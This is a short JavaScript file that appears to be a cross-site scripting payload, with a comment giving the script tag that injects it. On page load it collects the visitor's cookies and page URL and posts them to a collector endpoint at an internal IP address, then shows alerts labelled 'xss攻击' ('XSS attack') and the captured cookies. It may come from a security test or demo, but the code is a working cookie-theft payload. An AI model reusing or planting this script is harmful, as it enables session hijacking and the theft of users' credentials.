var target="http://10.200.4.96:8080/TRCTools/xss/add";

window.onload=function(){
	var test = window.location.href;
	var mtcookies=document.cookie;
//http://10.200.4.96:8080/TRCTools/js/app/test/b.js	
//<script src="http://10.200.4.96:8080/TRCTools/js/app/test/b.js"></script> 	
	$.post(target,{
		theurl:test,
		thecookie:mtcookies
		},function(result){

	},"json");
	alert('xss攻击');
	alert(mtcookies);
	
}